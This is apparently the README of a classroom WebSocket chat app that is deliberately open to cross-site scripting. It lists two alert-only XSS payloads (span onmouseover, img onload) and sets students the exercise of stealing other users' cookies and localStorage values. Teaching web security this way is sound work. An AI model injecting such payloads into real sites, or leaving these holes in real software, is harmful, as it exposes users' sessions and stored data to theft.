# Web-dev-chat

Chat example for web dev class.

### Showcase

#### Implemented
- add nicknames
- save nicknames on client side (localStorage)
- reconnect when WebSocket connection is broken
- add chat history

#### Todo
- highlight messages sent by current user
- fix time issues

### Web security

Allows to play with XSS attack:

```html
<span onmouseover="alert('XSS testing!')">Hello all!</span>
```

```html
<img onload="alert('I\'m a hacker!')" alt="" src="//upload.wikimedia.org/wikipedia/commons/thumb/c/c4/Backlit_keyboard.jpg/220px-Backlit_keyboard.jpg" decoding="async" width="220" height="124">
```

Task: steal cookies and localStorage values from other chat participants.
